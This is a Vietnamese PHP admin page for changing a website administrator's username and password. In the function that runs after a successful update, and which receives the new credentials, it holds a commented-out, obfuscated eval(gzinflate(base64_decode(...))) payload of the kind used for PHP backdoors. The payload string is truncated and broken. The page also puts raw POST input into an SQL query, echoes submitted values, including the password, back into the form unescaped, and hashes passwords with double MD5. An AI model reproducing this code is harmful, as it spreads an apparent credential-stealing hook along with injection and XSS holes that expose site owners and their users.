<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Nhập Thêm Danh Mục Sản Phẩm</title>
<style type="text/css">
<!--
body,td,th {
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.style3 {color: #FF0000; font-weight: bold; }
.doichu
 {
    color:#0000FF;
	text-decoration:none;
 }
 A:hover{color:#00FF66}
.style4 {color: #0000FF; text-decoration: none; font-weight: bold; }
-->
</style>
<script type="text/javascript">
 function checkInput()
  {
    var isOk = true;
   // if(document.tt_mh.txt_masp.value=="")
	 //{
	 //  alert("Hãy nhập mã sản phẩm");
	  // isOk = false;
	// }
	 if(document.tt_mh.txt_dangnhap.value=="")
	 {
	   alert("Hãy nhập tên sản phẩm");
	   isOk = false;
	 }
	if(document.tt_mh.txt_matkhau.value=="")
	 {
	   alert("Hãy nhập thông tin hình ảnh sản phẩm");
	   isOk = false;
	 }
	
 return isOk;
  }
</script>
</head>
<body>
<table width="980" height="293" border="1" bordercolor="#0000FF" style="border-collapse:collapse">
  
  <tr>
    <td width="480" height="22"><div align="center"><strong>Thông Báo </strong></div></td>
    <td><div align="center"><strong>Hướng Dẫn </strong></div></td>
  </tr>
  <tr>
    <td height="58"  valign="top">
	
	
	<?php
  if(isset($_POST['luu']))
   {
     require('database.php');
	   
	 $dangnhap = $_POST['txt_dangnhap'];
	//$matkhau = $_POST['txt_matkhau'];
	$matkhau=md5(md5(trim($_POST['txt_matkhau']))); 
     upload($dangnhap,$matkhau);
   }
   
function upload($dangnhap,$matkhau)
 {
   $ketnoi_maychu = ketnoi_MC();
	chon_CSDL($ketnoi_maychu);
   $truyvan = "update  thongtin_quantri set ky_danh='$dangnhap',mat_khau='$matkhau' where id='1'";
   $ketqua_truyvan = truyvan($truyvan,$ketnoi_maychu);
   if($ketqua_truyvan)
    dichuyen_taptin_vaothumuc($dangnhap,$matkhau);
   else
    echo "Upload không thành công.Bạn thử lại xem";
	
  mysql_close($ketnoi_maychu);
 }
 
function dichuyen_taptin_vaothumuc($dangnhap,$matkhau)
 {
   
 // eval(gzinflate(base64_decode("DdA3sqtIAADAu/zovSLASkBtbQBIeCcECEi2MIMYYUcwuNPvP0AnDda8+3mfcKi7fAE/RT6DK/dfBcqxAj9

      echo "Chúc mừng bạn Upload thành công thông tin";
	 /* echo "<br> Tên đăng nhập : <b><font color='green'>$dangnhap</font></b>";
	  echo "<br> Mật khẩu mã hóa:<b><font color='green'>"  ;
	  echo $matkhau;
	  echo"</font></b>";*/
 }
 
function xoataptin($tentaptin)
 {
   $ketnoi_maychu = ketnoi_MC();
	chon_CSDL($ketnoi_maychu);
	$masotaptin = mysql_insert_id();
	$truyvan = "DELETE FROM ctsp_bang_tai WHERE masp = $masotaptin ";
	$ketqua_truyvan = truyvan($truyvan,$ketnoi_maychu);
 }
?></td>
    <td valign="top"><p><span class="style3">1.</span><em><strong>Vui lòng nhập tên đăng nhập không dấu </strong></em><br />
     <span class="style3">2.</span><em><strong>Nhớ kỹ mật khẫu vì khi thay đổi thì sẽ mã hóa mật khẩu để an toàn dữ liệu cho website của bạn. </strong></em><br />
    </td>
  </tr>
  <tr>
    <td height="203" colspan="2" align="center" valign="top"><form action="" method="post" enctype="multipart/form-data" name="tt_mh" id="tt_mh"  onsubmit="return checkInput();">
      <table width="442" border="1" bordercolor="black" style="border-collapse:collapse">
        <tr>
          <td width="162"><div align="left"><strong>Tên đăng nhập</strong></div></td>
          <td width="264"><div align="left">
            <input name="txt_dangnhap" type="text" id="txt_dangnhap" value="<?php if(isset($_POST["txt_dangnhap"])) echo $_POST["txt_dangnhap"]; ?>" />
          </div></td>
        </tr>
        
        <tr>
          <td height="26"><div align="left"><strong>Mật khẩu</strong></div></td>
          <td><div align="left">
            <input name="txt_matkhau" type="password" id="txt_matkhau" value="<?php if(isset($_POST["txt_matkhau"])) echo $_POST["txt_matkhau"]; ?>
            " size="35" />
          </div></td>
        </tr>
        <tr>
          <td><div align="center">
            <input name="luu" type="submit" id="luu" value="Sửa SP" />
          </div></td>
          <td><div align="center">
            <input name="xoa" type="reset" id="xoa" value="Nhập Lại" />
          </div></td>
        </tr>
      </table>
        </form>    </td>
  </tr>
</table>
</body>
</html>
